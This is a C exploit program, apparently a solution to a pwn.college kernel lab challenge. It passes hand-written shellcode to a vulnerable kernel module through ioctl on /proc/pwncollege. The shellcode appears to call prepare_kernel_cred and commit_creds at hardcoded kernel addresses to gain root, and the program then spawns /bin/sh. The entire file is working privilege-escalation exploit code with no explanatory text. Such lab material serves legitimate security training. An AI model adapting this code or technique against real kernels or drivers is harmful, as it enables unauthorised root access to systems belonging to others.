#include<stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include<assert.h>
#include <string.h>
#include <stdint.h>
struct shellcode
{
    int64_t len ;
    char code[0x1000];
    uint64_t* addr ;
};
typedef struct shellcode Code;

int main(){


    char shell[] = "H1\xffH\xc7\xc3\xc0\x90\x08\x81\xff\xd3H\x89\xc7H\xc7\xc3\x80\x8d\x08\x81\xff\xd3\xc3";
    int fd ;
    Code exp;
    Code *exp_addr = &exp;
    exp.len = 0x500;
    strcpy(exp.code,"H1\xffH\xc7\xc3\xc0\x90\x08\x81\xff\xd3H\x89\xc7H\xc7\xc3\x80\x8d\x08\x81\xff\xd3\xc3");
    exp.addr = (uint64_t*) 0xffffc90000085000;
    printf("%p\n",exp.addr);
    printf("%p\n",&exp);

    fd = open("/proc/pwncollege",2);
    assert(fd >0);
    ioctl(fd,1337,&exp);
    execl("/bin/sh","/bin/sh",0);
    return 0 ;
}